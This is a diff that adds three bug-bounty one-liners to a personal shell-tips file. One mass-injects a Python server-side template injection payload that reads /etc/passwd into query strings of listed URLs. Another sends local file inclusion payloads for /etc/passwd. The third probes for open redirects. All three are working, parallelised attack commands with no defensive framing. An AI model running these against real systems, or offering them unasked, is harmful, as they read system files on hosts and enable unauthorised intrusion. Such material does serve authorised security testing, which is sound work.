@@ -176,3 +176,9 @@ cat file | awk '{gsub(/\\n/,"\n")}1'
 https://vsupalov.com/developing-with-python3-6-on-ubuntu-16-04/
 then to install python3.6-pip
 sudo python3.6 -m pip install -U pip
+
+cat ssti.txt | qsreplace "{{''.class.mro[2].subclasses()[40]('/etc/passwd').read()}}" | parallel -j50 -q curl -g | grep  "root:x"
+
+cat lfi.txt | qsreplace "/etc/passwd" | xargs -I % -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
+
+export LOCAL=http://localhost/; cat redirect.txt | qsreplace "$LOCAL" | xargs -I % -P 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: $LOCAL" && echo "VULN! {}"'
